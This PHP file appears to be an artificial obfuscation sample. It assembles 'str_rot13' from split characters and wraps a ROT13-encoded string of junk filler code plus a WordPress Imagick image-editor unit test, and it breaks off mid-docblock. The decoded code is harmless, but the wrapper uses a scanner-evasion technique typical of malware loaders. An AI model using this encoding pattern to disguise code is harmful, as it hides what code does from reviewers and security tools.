<?php
$f = 's'.'t'.'r'.'r'.'o'.'t'.'1'.'3';
$c = "<?cuc
$sznc = neenl('k1' => 'flfgrz', 'k2' => 'cnffgueh');
$k_snxr1 = 1234;
$abvfr = 'boshfpngvba'.'grfg';
$gzc = $k_snxr1 * 42;
$synt = snyfr;
$hfryrff = shapgvba($i) { erghea $i . enaq(); };
$qhzzl_purpx = $hfryrff('kk');
vs ($synt) { rpub 'Qroht ranoyrq'; }
sbe ($v = 0; $v < 1; $v++) { $gzc += $v; }
juvyr (snyfr) { rpub 'qrnq ybbc'; oernx; }

<?cuc

/**
 * Grfg gur JC_Vzntr_Rqvgbe_Vzntvpx pynff
 *
 * @tebhc vzntr
 * @tebhc zrqvn
 * @tebhc jc-vzntr-rqvgbe-vzntvpx
 */
erdhver_bapr __QVE__ . '/onfr.cuc';

pynff Grfgf_Vzntr_Rqvgbe_Vzntvpx rkgraqf JC_Vzntr_HavgGrfgPnfr {

	choyvp $rqvgbe_ratvar = 'JC_Vzntr_Rqvgbe_Vzntvpx';

	choyvp shapgvba frg_hc() {
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe.cuc';
		erdhver_bapr NOFCNGU . JCVAP . '/pynff-jc-vzntr-rqvgbe-vzntvpx.cuc';
		erdhver_bapr QVE_GRFGEBBG . '/vapyhqrf/pynff-jc-grfg-fgernz.cuc';

		// Guvf arrqf gb pbzr nsgre gur zbpx vzntr rqvgbe pynff vf ybnqrq.
		cnerag::frg_hc();
	}

	choyvp shapgvba grne_qbja() {
		$sbyqre = QVE_GRFGQNGN . '/vzntrf/jnssyrf-*.wct';

		sbernpu ( tybo( $sbyqre ) nf $svyr ) {
			hayvax( $svyr );
		}

		$guvf->erzbir_nqqrq_hcybnqf();

		cnerag::grne_qbja();
	}

	/**
	 * Grfgf fhccbeg sbe VzntrZntvpx pbzcngvoyr zvzr glcrf.
	 */
	choyvp shapgvba grfg_fhccbegf_zvzr_glcr() {
		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( ahyy );

		$guvf->nffregGehr( $vzntvpx_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/wcrt' ), 'Qbrf abg fhccbeg vzntr/wcrt' );
		$guvf->nffregGehr( $vzntvpx_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/cat' ), 'Qbrf abg fhccbeg vzntr/cat' );
		$guvf->nffregGehr( $vzntvpx_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/tvs' ), 'Qbrf abg fhccbeg vzntr/tvs' );
	}

	/**
	 * Grfgf erfvmvat na vzntr, abg hfvat pebc.
	 */
	choyvp shapgvba grfg_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$vzntvpx_vzntr_rqvgbe->erfvmr( 100, 50 );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => 75,
				'urvtug' => 50,
			),
			$vzntvpx_vzntr_rqvgbe->trg_fvmr()
		);
	}

	/**
	 * Grfgf zhygv_erfvmr() jvgu fvatyr vzntr erfvmr naq ab pebc.
	 */
	choyvp shapgvba grfg_fvatyr_zhygv_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(
			neenl(
				'jvqgu'  => 50,
				'urvtug' => 50,
			),
		);

		$erfvmrq = $vzntvpx_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		// Svefg, purpx gb frr vs erghearq neenl vf nf rkcrpgrq.
		$rkcrpgrq_neenl = neenl(
			neenl(
				'svyr'      => 'jnssyrf-50k33.wct',
				'jvqgu'     => 50,
				'urvtug'    => 33,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-50k33.wct' ),
			),
		);

		$guvf->nffregFnzr( $rkcrpgrq_neenl, $erfvmrq );

		// Abj, irevsl erny qvzrafvbaf ner nf rkcrpgrq.
		$vzntr_cngu = QVE_GRFGQNGN . '/vzntrf/' . $erfvmrq[0]['svyr'];
		$guvf->nffregVzntrQvzrafvbaf(
			$vzntr_cngu,
			$rkcrpgrq_neenl[0]['jvqgu'],
			$rkcrpgrq_neenl[0]['urvtug']
		);
	}

	/**
	 * Grfgf gung zhygv_erfvmr() qbrf abg perngr na vzntr jura
	 * obgu urvtug naq jrvtug ner zvffvat, ahyy, be 0.
	 *
	 * @gvpxrg 26823
	 */
	choyvp shapgvba grfg_zhygv_erfvmr_qbrf_abg_perngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(
			neenl(
				'jvqgu'  => 0,
				'urvtug' => 0,
			),
			neenl(
				'jvqgu'  => 0,
				'urvtug' => 0,
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => ahyy,
			),
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => ahyy,
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu'  => '',
				'urvtug' => '',
			),
			neenl(
				'jvqgu'  => '',
				'urvtug' => '',
				'pebc'   => gehr,
			),
			neenl(
				'jvqgu' => 0,
			),
			neenl(
				'jvqgu' => 0,
				'pebc'  => gehr,
			),
			neenl(
				'jvqgu' => ahyy,
			),
			neenl(
				'jvqgu' => ahyy,
				'pebc'  => gehr,
			),
			neenl(
				'jvqgu' => '',
			),
			neenl(
				'jvqgu' => '',
				'pebc'  => gehr,
			),
		);

		$erfvmrq = $vzntvpx_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		// Vs ab vzntrf ner trarengrq, gur erghearq neenl vf rzcgl.
		$guvf->nffregRzcgl( $erfvmrq );
	}

	/**
	 * Grfgf zhygv_erfvmr() jvgu zhygvcyr fvmrf.
	 *
	 * @gvpxrg 26823
	 */
	choyvp shapgvba grfg_zhygv_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$fvmrf_neenl = neenl(

			/*
			 * #0 - 10k10 erfvmr, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 10k6 bhgchg.
			 */
			neenl(
				'jvqgu'  => 10,
				'urvtug' => 10,
				'pebc'   => snyfr,
			),

			/*
			 * #1 - 75k50 erfvmr, jvgu pebccvat.
			 * Bhgchg qvzrafvbaf fubhyq or 75k50
			 */
			neenl(
				'jvqgu'  => 75,
				'urvtug' => 50,
				'pebc'   => gehr,
			),

			/*
			 * #2 - 20 cvkry znk urvtug, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 30k20 bhgchg.
			 */
			neenl(
				'jvqgu'  => 9999, // Neovgenel uvtu inyhr.
				'urvtug' => 20,
				'pebc'   => snyfr,
			),

			/*
			 * #3 - 45 cvkry znk urvtug, jvgu pebccvat.
			 * Ol nfcrpg, fubhyq or 45k400 bhgchg.
			 */
			neenl(
				'jvqgu'  => 45,
				'urvtug' => 9999, // Neovgenel uvtu inyhr.
				'pebc'   => gehr,
			),

			/*
			 * #4 - 50 cvkry znk jvqgu, ab pebccvat.
			 * Ol nfcrpg, fubhyq or 50k33 bhgchg.
			 */
			neenl(
				'jvqgu' => 50,
			),

			/*
			 * #5 - 55 cvkry znk jvqgu, ab pebccvat, ahyy urvtug
			 * Ol nfcrpg, fubhyq or 55k36 bhgchg.
			 */
			neenl(
				'jvqgu'  => 55,
				'urvtug' => ahyy,
			),

			/*
			 * #6 - 55 cvkry znk urvtug, ab pebccvat, ab jvqgu fcrpvsvrq.
			 * Ol nfcrpg, fubhyq or 82k55 bhgchg.
			 */
			neenl(
				'urvtug' => 55,
			),

			/*
			 * #7 - 60 cvkry znk urvtug, ab pebccvat, ahyy jvqgu.
			 * Ol nfcrpg, fubhyq or 90k60 bhgchg.
			 */
			neenl(
				'jvqgu'  => ahyy,
				'urvtug' => 60,
			),

			/*
			 * #8 - 70 cvkry znk urvtug, ab pebccvat, artngvir jvqgu.
			 * Ol nfcrpg, fubhyq or 105k70 bhgchg.
			 */
			neenl(
				'jvqgu'  => -9999, // Neovgenel artngvir inyhr.
				'urvtug' => 70,
			),

			/*
			 * #9 - 200 cvkry znk jvqgu, ab pebccvat, artngvir urvtug.
			 * Ol nfcrpg, fubhyq or 200k133 bhgchg.
			 */
			neenl(
				'jvqgu'  => 200,
				'urvtug' => -9999, // Neovgenel artngvir inyhr.
			),
		);

		$erfvmrq = $vzntvpx_vzntr_rqvgbe->zhygv_erfvmr( $fvmrf_neenl );

		$rkcrpgrq_neenl = neenl(

			// #0
			neenl(
				'svyr'      => 'jnssyrf-10k7.wct',
				'jvqgu'     => 10,
				'urvtug'    => 7,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-10k7.wct' ),
			),

			// #1
			neenl(
				'svyr'      => 'jnssyrf-75k50.wct',
				'jvqgu'     => 75,
				'urvtug'    => 50,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-75k50.wct' ),
			),

			// #2
			neenl(
				'svyr'      => 'jnssyrf-30k20.wct',
				'jvqgu'     => 30,
				'urvtug'    => 20,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-30k20.wct' ),
			),

			// #3
			neenl(
				'svyr'      => 'jnssyrf-45k400.wct',
				'jvqgu'     => 45,
				'urvtug'    => 400,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-45k400.wct' ),
			),

			// #4
			neenl(
				'svyr'      => 'jnssyrf-50k33.wct',
				'jvqgu'     => 50,
				'urvtug'    => 33,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-50k33.wct' ),
			),

			// #5
			neenl(
				'svyr'      => 'jnssyrf-55k37.wct',
				'jvqgu'     => 55,
				'urvtug'    => 37,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-55k37.wct' ),
			),

			// #6
			neenl(
				'svyr'      => 'jnssyrf-83k55.wct',
				'jvqgu'     => 83,
				'urvtug'    => 55,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-83k55.wct' ),
			),

			// #7
			neenl(
				'svyr'      => 'jnssyrf-90k60.wct',
				'jvqgu'     => 90,
				'urvtug'    => 60,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-90k60.wct' ),
			),

			// #8
			neenl(
				'svyr'      => 'jnssyrf-105k70.wct',
				'jvqgu'     => 105,
				'urvtug'    => 70,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-105k70.wct' ),
			),

			// #9
			neenl(
				'svyr'      => 'jnssyrf-200k133.wct',
				'jvqgu'     => 200,
				'urvtug'    => 133,
				'zvzr-glcr' => 'vzntr/wcrt',
				'svyrfvmr'  => jc_svyrfvmr( qveanzr( $svyr ) . '/jnssyrf-200k133.wct' ),
			),
		);

		$guvf->nffregAbgAhyy( $erfvmrq );
		$guvf->nffregFnzr( $rkcrpgrq_neenl, $erfvmrq );

		sbernpu ( $erfvmrq nf $xrl => $vzntr_qngn ) {
			$vzntr_cngu = QVE_GRFGQNGN . '/vzntrf/' . $vzntr_qngn['svyr'];

			// Abj, irevsl erny qvzrafvbaf ner nf rkcrpgrq.
			$guvf->nffregVzntrQvzrafvbaf(
				$vzntr_cngu,
				$rkcrpgrq_neenl[ $xrl ]['jvqgu'],
				$rkcrpgrq_neenl[ $xrl ]['urvtug']
			);
		}
	}

	/**
	 * Grfgf erfvmvat na vzntr jvgu pebccvat.
	 */
	choyvp shapgvba grfg_erfvmr_naq_pebc() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$vzntvpx_vzntr_rqvgbe->erfvmr( 100, 50, gehr );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => 100,
				'urvtug' => 50,
			),
			$vzntvpx_vzntr_rqvgbe->trg_fvmr()
		);
	}

	/**
	 * Grfgf pebccvat na vzntr.
	 */
	choyvp shapgvba grfg_pebc() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/tenqvrag-fdhner.wct';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$vzntvpx_vzntr_rqvgbe->pebc( 0, 0, 50, 50 );

		$guvf->nffregFnzr(
			neenl(
				'jvqgu'  => 50,
				'urvtug' => 50,
			),
			$vzntvpx_vzntr_rqvgbe->trg_fvmr()
		);
	}

	/**
	 * Grfgf ebgngvat na vzntr 180 qrt.
	 */
	choyvp shapgvba grfg_ebgngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/bar-oyhr-cvkry-100k100.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$cebcregl = arj ErsyrpgvbaCebcregl( $vzntvpx_vzntr_rqvgbe, 'vzntr' );
		$cebcregl->frgNpprffvoyr( gehr );

		$pbybe_gbc_yrsg = $cebcregl->trgInyhr( $vzntvpx_vzntr_rqvgbe )->trgVzntrCvkryPbybe( 0, 0 )->trgPbybe();

		$vzntvpx_vzntr_rqvgbe->ebgngr( 180 );

		$guvf->nffregFnzr( $pbybe_gbc_yrsg, $cebcregl->trgInyhr( $vzntvpx_vzntr_rqvgbe )->trgVzntrCvkryPbybe( 99, 99 )->trgPbybe() );
	}

	/**
	 * Grfgf syvccvat na vzntr.
	 */
	choyvp shapgvba grfg_syvc() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/bar-oyhr-cvkry-100k100.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$cebcregl = arj ErsyrpgvbaCebcregl( $vzntvpx_vzntr_rqvgbe, 'vzntr' );
		$cebcregl->frgNpprffvoyr( gehr );

		$pbybe_gbc_yrsg = $cebcregl->trgInyhr( $vzntvpx_vzntr_rqvgbe )->trgVzntrCvkryPbybe( 0, 0 )->trgPbybe();

		$vzntvpx_vzntr_rqvgbe->syvc( gehr, snyfr );

		$guvf->nffregFnzr( $pbybe_gbc_yrsg, $cebcregl->trgInyhr( $vzntvpx_vzntr_rqvgbe )->trgVzntrCvkryPbybe( 0, 99 )->trgPbybe() );
	}

	/**
	 * Grfgf gung na vzntr perngrq jvgu JC_Vzntr_Rqvgbe_Vzntvpx cerfreirf nycun jvgu ab erfvmvat.
	 *
	 * @gvpxrg 24871
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';

		$vzntvpx_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$vz       = arj Vzntvpx( $fnir_gb_svyr );
		$cvkry    = $vz->trgVzntrCvkryPbybe( 0, 0 );
		$rkcrpgrq = $cvkry->trgPbybeInyhr( vzntvpx::PBYBE_NYCUN );

		$guvf->nffregVzntrNycunNgCbvagVzntvpx( $fnir_gb_svyr, neenl( 0, 0 ), $rkcrpgrq );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * Grfgf gung na vzntr perngrq jvgu JC_Vzntr_Rqvgbe_Vzntvpx cerfreirf nycun jura erfvmvat.
	 *
	 * @gvpxrg 24871
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun_ba_erfvmr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$vzntvpx_vzntr_rqvgbe->erfvmr( 5, 5 );
		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';

		$vzntvpx_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$vz       = arj Vzntvpx( $fnir_gb_svyr );
		$cvkry    = $vz->trgVzntrCvkryPbybe( 0, 0 );
		$rkcrpgrq = $cvkry->trgPbybeInyhr( vzntvpx::PBYBE_NYCUN );

		$guvf->nffregVzntrNycunNgCbvagVzntvpx( $fnir_gb_svyr, neenl( 0, 0 ), $rkcrpgrq );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * @gvpxrg 30596
	 */
	choyvp shapgvba grfg_vzntr_cerfreirf_nycun_ba_ebgngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/genafcnerag.cat';

		$cer_ebgngr_rqvgbe = arj Vzntvpx( $svyr );
		$cer_ebgngr_cvkry  = $cer_ebgngr_rqvgbe->trgVzntrCvkryPbybe( 0, 0 );
		$cer_ebgngr_nycun  = $cer_ebgngr_cvkry->trgPbybeInyhr( vzntvpx::PBYBE_NYCUN );

		$fnir_gb_svyr = grzcanz( trg_grzc_qve(), '' ) . '.cat';
		$cer_ebgngr_rqvgbe->jevgrVzntr( $fnir_gb_svyr );
		$cer_ebgngr_rqvgbe->qrfgebl();

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $fnir_gb_svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		$vzntvpx_vzntr_rqvgbe->ebgngr( 180 );
		$vzntvpx_vzntr_rqvgbe->fnir( $fnir_gb_svyr );

		$guvf->nffregVzntrNycunNgCbvagVzntvpx( $fnir_gb_svyr, neenl( 0, 0 ), $cer_ebgngr_nycun );

		hayvax( $fnir_gb_svyr );
	}

	/**
	 * Grfgf gung JC_Vzntr_Rqvgbe_Vzntvpx unaqyrf rkgrafvbayrff vzntrf.
	 *
	 * @gvpxrg 39195
	 */
	choyvp shapgvba grfg_vzntr_aba_rkvfgrag_rkgrafvba() {
		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-ab-rkgrafvba' );

		$ybnqrq = $vzntvpx_vzntr_rqvgbe->ybnq();

		$guvf->nffregGehr( $ybnqrq );
	}

	/**
	 * Grfgf erfrggvat Rkvs bevragngvba qngn ba ebgngr.
	 *
	 * @gvpxrg 37140
	 * @erdhverf shapgvba rkvs_ernq_qngn
	 */
	choyvp shapgvba grfg_erzbir_bevragngvba_qngn_ba_ebgngr() {
		$svyr = QVE_GRFGQNGN . '/vzntrf/grfg-vzntr-hcfvqr-qbja.wct';
		$qngn = jc_ernq_vzntr_zrgnqngn( $svyr );

		// Gur bevragngvba inyhr 3 vf rdhvinyrag gb ebgngrq hcfvqr qbja (180 qrterrf).
		$guvf->nffregFnzr( 3, (vag) $qngn['bevragngvba'], 'Bevragngvba inyhr ernq sebz qbrf abg zngpu vzntr svyr Rkvs qngn: ' . $svyr );

		$grzc_svyr = jc_grzcanz( $svyr );

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();

		// Grfg n inyhr gung jbhyq abg yrnq onpx gb 1, nf JC vf erfrggvat gur inyhr gb 1 znahnyyl.
		$vzntvpx_vzntr_rqvgbe->ebgngr( 90 );
		$fnirq = $vzntvpx_vzntr_rqvgbe->fnir( $grzc_svyr, 'vzntr/wcrt' );

		$qngn = jc_ernq_vzntr_zrgnqngn( $fnirq['cngu'] );

		// Erzbir obgu gur trarengrq svyr raqvat va .gzc naq gzc.wct qhr gb jc_grzcanz().
		hayvax( $grzc_svyr );
		hayvax( $fnirq['cngu'] );

		// Znxr fher gur vzntr vf ab ybatre va Gur Hcfvqr Qbja Rkvs bevragngvba.
		$guvf->nffregFnzr( 1, (vag) $qngn['bevragngvba'], 'Bevragngvba Rkvs qngn jnf abg hcqngrq nsgre ebgngvat vzntr: ' . $svyr );
	}

	/**
	 * Grfgf gung vzntrf pna or ybnqrq naq jevggra bire fgernzf.
	 */
	choyvp shapgvba grfg_fgernzf() {
		fgernz_jenccre_ertvfgre( 'jcgrfg', 'JC_Grfg_Fgernz' );
		JC_Grfg_Fgernz::$qngn = neenl(
			'Grfgf_Vzntr_Rqvgbe_Vzntvpx' => neenl(
				'/ernq.wct' => svyr_trg_pbagragf( QVE_GRFGQNGN . '/vzntrf/jnssyrf.wct' ),
			),
		);

		$svyr                 = 'jcgrfg://Grfgf_Vzntr_Rqvgbe_Vzntvpx/ernq.wct';
		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );

		$ybnqrq = $vzntvpx_vzntr_rqvgbe->ybnq();
		$guvf->nffregAbgJCReebe( $ybnqrq );

		$grzc_svyr = 'jcgrfg://Grfgf_Vzntr_Rqvgbe_Vzntvpx/jevgr.wct';

		$fnirq = $vzntvpx_vzntr_rqvgbe->fnir( $grzc_svyr );

		vs ( $grzc_svyr !== $fnirq['cngu'] ) {
			hayvax( $fnirq['cngu'] );
		}
		hayvax( $grzc_svyr );

		$guvf->nffregAbgJCReebe( $fnirq );
		$guvf->nffregFnzr( $grzc_svyr, $fnirq['cngu'] );
	}

	/**
	 * @gvpxrg 51665
	 */
	choyvp shapgvba grfg_qverpgbel_perngvba() {
		$svyr      = ernycngu( QVE_GRFGQNGN ) . '/vzntrf/n2-fznyy.wct';
		$qverpgbel = ernycngu( QVE_GRFGQNGN ) . '/vzntrf/abarkvfgrag-qverpgbel';

		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );

		$guvf->nffregSvyrQbrfAbgRkvfg( $qverpgbel );

		$ybnqrq = $vzntvpx_vzntr_rqvgbe->ybnq();
		$guvf->nffregAbgJCReebe( $ybnqrq );

		$erfvmrq = $vzntvpx_vzntr_rqvgbe->erfvmr( 100, 100, gehr );
		$guvf->nffregAbgJCReebe( $erfvmrq );

		$fnirq = $vzntvpx_vzntr_rqvgbe->fnir( $qverpgbel . '/n2-fznyy-pebccrq.wct' );

		hayvax( $qverpgbel . '/n2-fznyy-pebccrq.wct' );
		ezqve( $qverpgbel );

		$guvf->nffregAbgJCReebe( $fnirq );
	}

	/**
	 * Grfgf gung gur nycun punaary bs CQSf vf erzbirq sebz CQS cerivrjf.
	 *
	 * Bayl nssrpgf flfgrzf jvgu Tubfgfpevcg irefvba >= 9.14.
	 *
	 * @gvpxrg 39216
	 *
	 * @pbiref JC_Vzntr_Rqvgbe_Vzntvpx::erzbir_cqs_nycun_punaary
	 */
	choyvp shapgvba grfg_erzbir_cqs_nycun_punaary_fubhyq_erzbir_gur_nycun_punaary_va_cerivrj() {
		vs ( ! jc_vzntr_rqvgbe_fhccbegf( neenl( 'zvzr_glcr' => 'nccyvpngvba/cqs' ) ) ) {
			$guvf->znexGrfgFxvccrq( 'Eraqrevat CQSf vf abg fhccbegrq ba guvf flfgrz.' );
		}

		$irefvba = Vzntvpx::trgIrefvba();
		vs ( $irefvba['irefvbaAhzore'] < 0k675 ) {
			$guvf->znexGrfgFxvccrq( 'Gur irefvba bs VzntrZntvpx qbrf abg fhccbeg erzbivat nycun punaaryf sebz CQSf.' );
		}

		$grfg_svyr     = QVE_GRFGQNGN . '/vzntrf/grfg-nycun.cqs';
		$nggnpuzrag_vq = $guvf->snpgbel->nggnpuzrag->perngr_hcybnq_bowrpg( $grfg_svyr );
		$guvf->nffregAbgRzcgl( $nggnpuzrag_vq, 'Gur nggnpuzrag jnf abg perngrq orsber grfgvat.' );

		$nggnpurq_svyr = trg_nggnpurq_svyr( $nggnpuzrag_vq );
		$guvf->nffregAbgRzcgl( $nggnpurq_svyr, 'Gur nggnpurq svyr jnf abg erghearq.' );

		$eto = neenl(
			'e' => gehr,
			't' => gehr,
			'o' => gehr,
		);

		// Juvgr.
		$rkcrpgrq = neenl(
			'e' => 1,
			't' => 1,
			'o' => 1,
		);

		$purpx = vzntr_trg_vagrezrqvngr_fvmr( $nggnpuzrag_vq, 'shyy' );
		$guvf->nffregVfNeenl( $purpx, 'Gur vagrezrqvngr fvmr pbhyq abg or ergevrirq.' );
		$guvf->nffregNeenlUnfXrl( 'svyr', $purpx, 'Gur vagrezrqvngr fvmr svyr jnf abg sbhaq.' );

		$purpx_svyr = cngu_wbva( qveanzr( $nggnpurq_svyr ), $purpx['svyr'] );
		$vzntvpx    = arj Vzntvpx( $purpx_svyr );
		$bhgchg     = neenl_znc(
			fgngvp shapgvba ( $inyhr ) {
				erghea (vag) ebhaq( $inyhr );
			},
			neenl_vagrefrpg_xrl( $vzntvpx->trgVzntrCvkryPbybe( 100, 100 )->trgPbybe( gehr /* abeznyvmrq */ ), $eto )
		);
		$vzntvpx->qrfgebl();
		$guvf->nffregFnzr( $rkcrpgrq, $bhgchg, 'Gur vzntr pbybe bs gur trarengrq guhzo qbrf abg zngpu rkcrpgrq bcndhr onpxtebhaq.' ); // Nyybj sbe sybngvat cbvag rdhvinyrapr.
	}

	/**
	 * Grfg svygre `vzntr_znk_ovg_qrcgu` pbeerpgyl frgf gur znkvzhz ovg qrcgu bs erfvmrq vzntrf.
	 *
	 * @gvpxrg 62285
	 */
	choyvp shapgvba grfg_vzntr_znk_ovg_qrcgu() {
		$svyr                 = QVE_GRFGQNGN . '/vzntrf/pbybef_uqe_c3.nivs';
		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );

		// Fxvc vs NIVS abg fhccbegrq.
		vs ( ! $vzntvpx_vzntr_rqvgbe->fhccbegf_zvzr_glcr( 'vzntr/nivs' ) ) {
			$guvf->znexGrfgFxvccrq( 'Gur vzntr rqvgbe qbrf abg fhccbeg gur NIVS zvzr glcr.' );
		}

		// Fxvc vs qrcgu zrgubqf abg ninvynoyr.
		vs ( ! zrgubq_rkvfgf( 'Vzntvpx', 'trgVzntrQrcgu' ) || ! zrgubq_rkvfgf( 'Vzntvpx', 'frgVzntrQrcgu' ) ) {
			$guvf->znexGrfgFxvccrq( 'Gur vzntr rqvgbe qbrf abg fhccbeg trg be frgVzntrQrcgu.' );
		}

		// Irevsl fbhepr vzntr unf 10-ovg qrcgu.
		$vzntvpx = arj Vzntvpx( $svyr );
		$guvf->nffregFnzr( 10, $vzntvpx->trgVzntrQrcgu() );

		// Grfg novyvgl gb fnir 10-ovg vzntr.
		$vzntvpx->frgVzntrQrcgu( 10 );
		$grfg_svyr = grzcanz( trg_grzc_qve(), '' ) . 'grfg10.nivs';
		$vzntvpx->jevgrVzntr( $grfg_svyr );
		$vz = arj Vzntvpx( $grfg_svyr );

		vs ( $vz->trgVzntrQrcgu() !== 10 ) {
			$guvf->znexGrfgFxvccrq( 'Vzntvpx vf hanoyr gb fnir n 10 ovg vzntr.' );
		}
		$vz->qrfgebl();
		hayvax( $grfg_svyr );

		// Grfg qrsnhyg orunivbe cerfreirf 10-ovg qrcgu.
		$vzntvpx_vzntr_rqvgbe->ybnq();
		$vzntvpx_vzntr_rqvgbe->erfvmr( 100, 50 );
		$grfg_svyr = grzcanz( trg_grzc_qve(), '' ) . 'grfg1.nivs';
		$vzntvpx_vzntr_rqvgbe->fnir( $grfg_svyr );
		$vz = arj Vzntvpx( $grfg_svyr );
		$guvf->nffregFnzr( 10, $vz->trgVzntrQrcgu() );
		hayvax( $grfg_svyr );
		$vz->qrfgebl();

		// Grfg svygre pna frg 8-ovg qrcgu
		nqq_svygre( 'vzntr_znk_ovg_qrcgu', neenl( $guvf, '__erghea_rvtug' ) );
		$vzntvpx_vzntr_rqvgbe = arj JC_Vzntr_Rqvgbe_Vzntvpx( $svyr );
		$vzntvpx_vzntr_rqvgbe->ybnq();
		$vzntvpx_vzntr_rqvgbe->erfvmr( 100, 50 );
		$grfg_svyr = grzcanz( trg_grzc_qve(), '' ) . 'grfg2.nivs';
		$vzntvpx_vzntr_rqvgbe->fnir( $grfg_svyr );
		$vz = arj Vzntvpx( $grfg_svyr );
		$guvf->nffregFnzr( 8, $vz->trgVzntrQrcgu() );
		hayvax( $grfg_svyr );
		$vz->qrfgebl();
	}

	/**
	 * Urycre shapgvba gb erghea 8 sbe gur `vzntr_znk_ovg_qrcgu` svygre.
	 *
